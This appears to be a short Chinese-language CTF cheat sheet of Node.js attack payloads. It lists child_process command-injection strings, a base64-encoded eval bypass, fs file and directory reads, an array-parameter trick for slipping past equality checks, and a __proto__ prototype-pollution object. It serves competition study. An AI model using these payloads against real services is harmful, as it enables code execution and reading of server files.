

```node
// shell 执行
require('child_process').execSync('ls').toString();
require('child_process').spawnSync('ls').stdout;
require('child_process').spawnSync('tac', ['fl001g.txt']).stdout;
// 编码绕过
// require('child_process').execSync('ls')
eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdscycp",'base64').toString('ascii'))


// 读取文件
require('fs').readFileSync('app.js').toString();
// 读取目录
require('fs').readdirSync('.').toString();
```

---

## WAF绕过

[[nodejs绕过md5]]
```node
// 可以绕过一些相等判断
?a[]=1&b=1
```

---

## 原型链污染
[[原型链污染|什么是原型链污染？]]
```json
{
    "__proto__": {
        "polluted": "value"
    }
}
```